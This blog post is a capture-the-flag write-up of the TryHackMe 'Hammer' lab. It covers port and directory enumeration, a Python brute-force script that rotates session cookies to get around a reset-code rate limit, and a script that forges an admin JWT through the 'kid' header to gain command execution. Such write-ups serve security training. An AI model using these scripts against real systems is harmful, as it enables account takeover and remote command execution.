---
layout: post
title:  "Hammer (THM)"
date:   2025-08-28 21:26:20 -0400
author: robo.uzi
tags: [TryHackMe, ctf]
---

## Initial Access
{% raw %}
`nmap -p- -T5 -vv 10.10.226.3 -oN hammerfullnmap.txt`

`nmap -sVC -p 22,1337 -vv -T4 10.10.226.3 -oN hammernmap.txt`: 
```shell
PORT     STATE SERVICE REASON  VERSION  
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))  
| http-cookie-flags:    
|   /:    
|     PHPSESSID:    
|_      httponly flag not set  
|_http-title: Login  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I visit `http://10.10.226.3:1337/`. In the source code I see this comment: `<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->`.

There is a password reset at `http://10.10.226.3:1337/reset_password.php`.

```shell
ffuf -u http://10.10.226.3:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt -t 60
css          [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 222ms]  
images       [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 226ms]  
js           [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 219ms]  
logs         [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 224ms]
```

At `http://10.10.226.3:1337/hmr_logs/error.logs`:
```HTML
AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch

AH01627: client denied by server configuration: /etc/shadow

AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected

AH01627: client denied by server configuration: /home/hammerthm/test.php

AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address

AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```
Some interesting things: `/restricted-area`, `/var/www/html/protected`, `/home/hammerthm/text.php`, `/admin-login`, and `/var/www/html/locked-down`. I cant visit any of these in my browser.

There is an email: `tester@hammer.thm`. I submit the email to the password reset page and I get 180 seconds to submit a 4 digit code. 

This javascript was on the page:
```javascript
let countdownv = 180;
function startCountdown() {
    let timerElement = document.getElementById("countdown");
    const hiddenField = document.getElementById("s");
    let interval = setInterval(function() {
        countdownv--;
        hiddenField.value = countdownv;
        if (countdownv <= 0) {
            clearInterval(interval);
            //alert("hello");
            window.location.href = 'logout.php';
        }
        timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
    }, 1000);
}
```

I capture the post request to `/reset_password.php` with burp and change it from `recovery_code=4444&s=175` to `recovery_code=4444&s=50000`. This doesnt actually make the time you get to guess longer.

```shell
ffuf -w pins.txt:PIN -u http://10.10.226.3:1337/reset_password.php -X POST -d "recovery_code=PIN&s=49950" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=tckgcf20lul9hkikqc5sqhv7re" -mc all -t 50
```
Running this results in `Rate limit exceeded. Please try again later.` My bad.  

I looked in the response and see this header: `Rate-Limit-Pending: 4`. When it hits 0 the rate limit is exceeded and you cannot access the page anymore.

Through testing you can notice the `Rate-Limit-Pending` header going from 8 to 0. Again when it hits 0 you have no more guesses and are locked out. This is tied to your `PHPSESSID`. So each session gets 7 guesses. 

I run this script to get the code:
```python
#!/usr/bin/env python3
import subprocess

BASE_URL = "http://10.10.179.150:1337"

def get_phpsessid():
    # get new PHPSESSID
    reset_command = [
        "curl", "-s", "-X", "POST", f"{BASE_URL}/reset_password.php",
        "-d", "email=tester%40hammer.thm",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-v"
    ]
    response = subprocess.run(reset_command, capture_output=True, text=True)

    # get PHPSESSID from response
    for line in response.stderr.splitlines():
        if "Set-Cookie: PHPSESSID=" in line:
            return line.split("PHPSESSID=")[1].split(";")[0]
    return None

def submit_recovery_code(phpsessid, recovery_code):
    recovery_command = [
        "curl", "-s", "-X", "POST", f"{BASE_URL}/reset_password.php",
        "-d", f"recovery_code={recovery_code}&s=180",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", f"Cookie: PHPSESSID={phpsessid}"
    ]
    response = subprocess.run(recovery_command, capture_output=True, text=True)
    return response.stdout

def main():
    phpsessid = get_phpsessid()
    if not phpsessid:
        print("Failed to retrieve initial PHPSESSID.")
        return
	# Rotate session every 7 guesses
    for i in range(10000):
        if i % 7 == 0:
            phpsessid = get_phpsessid()
            if not phpsessid:
                print(f"Failed to get PHPSESSID at attempt {i}.")
                continue

        recovery_code = f"{i:04d}"
        print(f"Trying {recovery_code} with PHPSESSID={phpsessid}")
        response_text = submit_recovery_code(phpsessid, recovery_code)

        if "Invalid or expired recovery code!" not in response_text \
           and "Time elapsed" not in response_text \
           and "Rate limit exceeded" not in response_text:
            print(f"Found recovery code: {recovery_code}")
            print(f"PHPSESSID: {phpsessid}")
            print(response_text)
            break

if __name__ == "__main__":
    main()
```
After some time I get:
```shell
Found recovery code: 1146  
PHPSESSID: tdj764kc51sj9u78e0b1dhdcgq
```

I enter this cookie and refresh the page. I am now able to reset the password for `tester@hammer.thm`.

Im able to login but after some time I am logged out. I quickly open the source code for the page so I can look at it longer. 

The page contains a script that checks the cookies after some time and if `persistentSession` is not set to true you are logged out. 
```javascript
 function getCookie(name) {
     const value = `; ${document.cookie}`;
     const parts = value.split(`; ${name}=`);
     if (parts.length === 2) return parts.pop().split(';').shift();
 }
 function checkTrailUserCookie() {
     const trailUser = getCookie('persistentSession');
     if (!trailUser) {

         window.location.href = 'logout.php';
     }
 }
 setInterval(checkTrailUserCookie, 1000);
```

Also a script that contains a hardcoded jwt and makes an AJAX POST request to `/execute_command.php`. It either displays the results of the command or an error:
```javascript
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzU2MzYxNzYyLCJleHAiOjE3NTYzNjUzNjIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.4R0Dh7r-JChtUBcimMGDQhhyPpBtbWcje_D-EX-dGlE';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({
                command: command
            }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
```

Putting the jwt into `https://www.jwt.io/`:
```shell
Header:
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
Payload:
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1756361762,
  "exp": 1756365362,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

I intercept the POST request to `/execute_command.php` and put it the in the repeater tab in burpsuite. The only command I can easily run is `ls`.

All listed files I have seen except one: `redacted.key`

To forge a jwt with admin permissions a can edit the `kid` header to contain the right filepath and add a line to accept the contents of the key:
```python
import jwt

secret_key = "redacted"

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/redacted.key"
}
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1756361762,
    "exp": 1756365362,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
print(token)
```
Just copy the format of the found jwt. Change the role to `admin`.

I run the script and check the output jwt on `https://www.jwt.io/`. Everything looks good. 

In burp replace the `Authorization` header and cookie `token` value with the forged jwt. Run the command `cat /home/ubuntu/flag.txt` and thats it! Got RCE.
{% endraw %}
___

